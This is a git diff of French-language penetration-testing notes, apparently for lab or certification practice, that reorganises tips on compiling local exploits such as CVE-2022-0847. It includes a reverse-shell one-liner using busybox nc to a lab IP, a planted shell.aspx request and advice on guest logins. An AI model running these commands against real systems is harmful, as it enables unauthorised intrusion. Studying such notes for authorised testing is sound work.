@@ -38,20 +38,21 @@ sudo tee -a /etc/hosts < hosts
 
 ## Exploits 
 
-```bash
-sudo apt install default-jdk -y
-```
-
-Prendre le temps de bien lire les messages d'erreurs
-Bien lire le code en conséquence pour comprendre
-
-Compiler avec -static pur inclure les dépendances
+- Prendre le temps de bien lire les messages d'erreurs
+- Bien lire le code en conséquence pour comprendre
+- Compiler avec -static pur inclure les dépendances
 ```bash
 gcc 50808.c -static -o CVE-2022-0847
 ```
 
-Erreur python3 -> essayer python2
-exploits java : tenter d'aurtes choses que bash pour revshell par exemple : `python2 46501.py -t 127.0.0.1 --cmd 'busybox nc 192.168.45.172 4444 -e sh'`
+- Erreur python3 -> essayer python2
+- exploits java : tenter d'aurtes choses que bash pour revshell par exemple : `python2 46501.py -t 127.0.0.1 --cmd 'busybox nc 192.168.45.172 4444 -e sh'`
+
+```bash
+sudo apt install default-jdk -y
+```
+
+- chercher direct sur github si les exploits de exploits-db / msf marchent pas
 ## Misc
 
 ```powershell
@@ -199,3 +200,6 @@ curl http://$target/shell.aspx
 ```
 
 Toujours tester anonymous/guest sur 445, 21, 135
+
+## Astuces
+exe ou script sur la machine qui semble bizarre -> executer / tester
